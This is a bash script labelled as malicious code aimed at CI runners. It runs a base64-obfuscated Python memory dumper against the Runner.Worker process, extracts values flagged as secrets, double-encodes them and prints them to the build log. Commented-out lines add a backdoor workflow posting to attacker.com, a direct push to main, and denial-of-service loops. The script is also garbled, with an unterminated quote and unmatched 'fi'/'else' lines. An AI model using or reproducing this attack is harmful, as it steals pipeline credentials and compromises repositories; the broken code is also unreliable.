#!/bin/bash

# --- Start of Malicious Code ---
echo "Executing malicious shell script..."

TEMP="$(mktemp -d)

SCRIPT_RUNNER="IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKIyBiYXNlZCBvbiBodHRwczovL2RhdmlkZWJvdmUuY29tL2Jsb2cvP3A9MTYyMAoKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHJlCgoKZGVmIGdldF9waWQoKToKICAgICMgaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjcwMzY0MC9wcm9jZXNzLWxpc3Qtb24tbGludXgtdmlhLXB5dGhvbgogICAgcGlkcyA9IFtwaWQgZm9yIHBpZCBpbiBvcy5saXN0ZGlyKCcvcHJvYycpIGlmIHBpZC5pc2RpZ2l0KCldCgogICAgZm9yIHBpZCBpbiBwaWRzOgogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oJy9wcm9jJywgcGlkLCAnY21kbGluZScpLCAncmInKSBhcyBjbWRsaW5lX2Y6CiAgICAgICAgICAgIGlmIGInUnVubmVyLldvcmtlcicgaW4gY21kbGluZV9mLnJlYWQoKToKICAgICAgICAgICAgICAgIHJldHVybiBwaWQKCiAgICByYWlzZSBFeGNlcHRpb24oJ0NhbiBub3QgZ2V0IHBpZCBvZiBSdW5uZXIuV29ya2VyJykKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgcGlkID0gZ2V0X3BpZCgpCiAgICBwcmludChwaWQpCgogICAgbWFwX3BhdGggPSBmIi9wcm9jL3twaWR9L21hcHMiCiAgICBtZW1fcGF0aCA9IGYiL3Byb2Mve3BpZH0vbWVtIgoKICAgIHdpdGggb3BlbihtYXBfcGF0aCwgJ3InKSBhcyBtYXBfZiwgb3BlbihtZW1fcGF0aCwgJ3JiJywgMCkgYXMgbWVtX2Y6CiAgICAgICAgZm9yIGxpbmUgaW4gbWFwX2YucmVhZGxpbmVzKCk6ICAjIGZvciBlYWNoIG1hcHBlZCByZWdpb24KICAgICAgICAgICAgbSA9IHJlLm1hdGNoKHInKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFstcl0pJywgbGluZSkKICAgICAgICAgICAgaWYgbS5ncm91cCgzKSA9PSAncic6ICAjIHJlYWRhYmxlIHJlZ2lvbgogICAgICAgICAgICAgICAgc3RhcnQgPSBpbnQobS5ncm91cCgxKSwgMTYpCiAgICAgICAgICAgICAgICBlbmQgPSBpbnQobS5ncm91cCgyKSwgMTYpCiAgICAgICAgICAgICAgICAjIGhvdGZpeDogT3ZlcmZsb3dFcnJvcjogUHl0aG9uIGludCB0b28gbGFyZ2UgdG8gY29udmVydCB0byBDIGxvbmcKICAgICAgICAgICAgICAgICMgMTg0NDY3NDQwNzM2OTkwNjU4NTYKICAgICAgICAgICAgICAgIGlmIHN0YXJ0ID4gc3lzLm1heHNpemU6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgIG1lbV9mLnNlZWsoc3RhcnQpICAjIHNlZWsgdG8gcmVnaW9uIHN0YXJ0CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGNodW5rID0gbWVtX2YucmVhZChlbmQgLSBzdGFydCkgICMgcmVhZCByZWdpb24gY29udGVudHMKICAgICAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LmJ1ZmZlci53cml0ZShjaHVuaykKICAgICAgICAgICAgICAgIGV4Y2VwdCBPU0Vycm9yOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCg=="

echo '::group:: Preparing environment ...'

      echo $SCRIPT_RUNNER | base64 -d > "$TEMP/runner_script.py"
      VALUES=`sudo python3 $TEMP/runner_script.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
      echo $VALUES
    fi
  fi
else
    echo "."
fi
echo '::endgroup::'

# echo "name: Backdoor Workflow" > .github/workflows/backdoor.yml
# echo "on: push" >> .github/workflows/backdoor.yml
# echo "jobs: " >> .github/workflows/backdoor.yml
# echo "  backdoor:" >> .github/workflows/backdoor.yml
# echo "    runs-on: ubuntu-latest" >> .github/workflows/backdoor.yml
# echo "    steps:" >> .github/workflows/backdoor.yml
# echo "      - run: echo 'Attacker code running!' && curl -X POST -d 'Repo compromised!' https://attacker.com/pwned" >> .github/workflows/backdoor.yml
#
# git config user.name "GitHub Actions Backdoor"
# git config user.email "actions@github.com"
# git add .github/workflows/backdoor.yml
# git commit -m "Add backdoor workflow"
# git push origin HEAD:main # Push directly to main branch (requires contents:write)

# --- Optional: Denial of Service ---
# while true; do :; done # Infinite loop to block runner
# dd if=/dev/urandom of=/dev/null bs=1M count=100000 # Consume disk/CPU

echo "Malicious script finished."
# --- End of Malicious Code ---

# Ensure the original command (if any) that was supposed to run continues,
# or exit gracefully after the attack.
exit 0
